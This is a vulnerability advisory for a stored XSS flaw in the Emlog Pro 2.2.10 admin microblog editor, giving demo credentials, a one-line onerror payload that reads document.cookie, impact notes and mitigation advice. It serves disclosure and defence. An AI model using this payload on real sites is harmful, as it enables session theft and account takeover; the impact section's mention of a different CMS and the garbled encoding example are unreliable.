## Vulnerability Title: Emlog Pro 2.2.10 /admin/twitter.php Stored XSS Vulnerability

- #### Vulnerability Type: Stored XSS Vulnerability
- #### Vendor Homepage: https://www.emlog.net/
- #### Software Link: https://github.com/emlog/emlog
- #### Affected Software/Version: pro 2.2.10

## Application Demo and credentials

- URL   
https://demo.emlog.cn/admin/account.php?action=signin   
username:emlog   
password:emlogpro   

## Technical Details & Exploit:

In Location "微语 >编辑"
<img width="967" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/15539c9c-07b8-4422-a173-67c73a0691ea">
paylpad:
```
"><img src=1 onerror=alert(document.cookie)>
```
<img width="1189" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/6fd3faaa-6d77-4566-b013-6beed69dc476">
Click "保存"
<img width="1102" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/c9912192-4d99-448d-97db-e51e342eb19d">


## Impact:

XSS attacks can be used to steal sensitive information from users, such as session tokens, cookies, or personal data. Attackers can inject malicious scripts that send this information to their own servers, effectively compromising user accounts and privacy.In the Dice CMS system, it's possible to steal the administrator's cookie, thereby taking over the account.

## Mitigation/Solution:

- Encode Data on Output

Description: Ensure that any data rendered on web pages is encoded, so that browser interprets it only as data, not executable code.  This is crucial for data displayed in HTML, JavaScript, or inserted into URLs.
Implementation: Use context-appropriate encoding functions to escape special characters.  For example, in HTML contexts, < should be encoded as <, > as >, and so on.

2.  Validate and Sanitize Input

Description: All user-supplied data should be validated against a strict specification and sanitized to remove or escape harmful characters.  This includes data from query parameters, form submissions, cookies, and any external sources.
Implementation: Use libraries or functions that specifically sanitize input for XSS, removing or encoding potentially malicious characters.  Regular expressions can also be used for custom validation rules.

3.  Use Content Security Policy (CSP)

Description: CSP is a browser security feature that helps detect and mitigate certain types of attacks, including XSS and data injection attacks.  It allows you to specify the domains a browser should consider as valid sources of executable scripts.
Implementation: Implement CSP by adding the Content-Security-Policy HTTP header to instruct browsers to only execute scripts from trusted sources.  Start with a strict policy and gradually relax it as necessary.
